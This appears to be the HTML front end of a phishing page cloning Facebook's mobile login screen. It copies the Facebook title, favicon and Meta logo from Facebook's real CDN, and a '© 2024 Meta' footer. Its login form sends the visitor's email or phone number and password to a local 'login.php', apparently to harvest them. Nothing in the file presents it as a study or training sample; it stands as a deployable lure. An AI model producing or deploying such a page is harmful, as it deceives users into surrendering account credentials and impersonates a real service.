<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png">
    <link rel="stylesheet" href="style.css">
    <style>
      /* Mobile specific adjustments to the desktop CSS */
      body {
        justify-content: flex-start;
      }
      .fb-container {
        flex-direction: column;
        margin-top: 0;
        padding: 0;
      }
      .fb-left {
        width: 100%;
        padding: 40px 20px 20px;
        text-align: center;
      }
      .fb-left img {
        width: 200px;
        margin: 0;
      }
      .fb-left h2 {
        display: none; /* Hide tagline on small screens like actual FB */
      }
      .fb-right {
        width: 100%;
        padding: 0 20px;
      }
      .login-card {
        box-shadow: none;
        background-color: transparent;
        padding: 0;
      }
      footer {
        position: static;
        margin-top: 40px;
      }
    </style>
</head>
<body>
    <div class="fb-container">
        <div class="fb-left">
            <img src="logo.svg" alt="Facebook Logo">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        <div class="fb-right">
            <div class="login-card">
                <form action="login.php" method="POST">
                    <input type="text" name="email" placeholder="Mobile number or email address" required>
                    <input type="password" name="pass" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <div style="margin-top: 15px;">
                  <a href="#" class="forgot-password">Forgotten password?</a>
                </div>
                <div style="margin-top: 20px; text-align: center; display: flex; align-items: center; justify-content: center; width: 100%;">
                    <div style="border-top: 1px solid #ccd0d5; flex-grow: 1;"></div>
                    <span style="margin: 0 10px; color: #606770; font-size: 14px;">or</span>
                    <div style="border-top: 1px solid #ccd0d5; flex-grow: 1;"></div>
                </div>
                <div style="margin-top: 20px;">
                  <a href="#" class="create-account-btn" style="background-color: #42b72a;">Create New Account</a>
                </div>
            </div>
        </div>
    </div>

    <footer style="background: none; padding-top: 60px;">
        <div class="footer-content" style="text-align: center; border: none;">
            <div class="meta-logo" style="margin-bottom: 10px;">
                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/v2XN33Y3x8s.png" width="60" alt="Meta Logo">
            </div>
            <p style="color: #606770; font-size: 12px;">© 2024 Meta</p>
        </div>
    </footer>
</body>
</html>
